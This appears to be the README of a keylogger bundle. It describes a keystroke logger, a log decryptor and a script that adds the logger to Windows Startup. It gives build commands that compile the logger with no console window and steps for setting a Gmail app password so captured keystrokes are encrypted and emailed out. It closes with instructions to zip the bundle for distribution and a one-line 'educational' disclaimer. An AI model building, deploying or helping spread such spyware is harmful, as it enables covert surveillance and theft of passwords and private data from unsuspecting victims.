Keylogger Bundle Package
========================

This package includes:
1. logger.py - The main keylogger script (compile to logger.exe).
2. decrypt_gui.py - A simple GUI tool to decrypt the encrypted log.
3. add_to_startup.py - Script to add the logger executable to Windows Startup.

Setup Instructions:
-------------------
1. Install dependencies:
   - pip install pynput cryptography tk pyinstaller

2. Compile the scripts into executables:
   - For the keylogger:
     pyinstaller --onefile --noconsole logger.py
   - For the decryptor:
     pyinstaller --onefile --noconsole decrypt_gui.py

3. To enable auto-start:
   - Run add_to_startup.py after you have built logger.exe.

4. Gmail Secure Login:
   - Enable 2-Step Verification on your Gmail account.
   - Generate an App Password at https://myaccount.google.com/security.
   - Replace the EMAIL_PASSWORD in logger.py with your App Password.

5. Deployment:
   - Place the compiled executables in the 'dist' folder.
   - Bundle the other scripts and README.txt together into a .zip file for distribution.

Usage:
------
- Run logger.exe to start logging keystrokes.
- Press ESC to exit, encrypt, and automatically send the encrypted log via email.
- Use decrypt_gui.exe to decrypt the encrypted keylogger report.

Note: This tool is provided solely for educational and lab testing purposes.
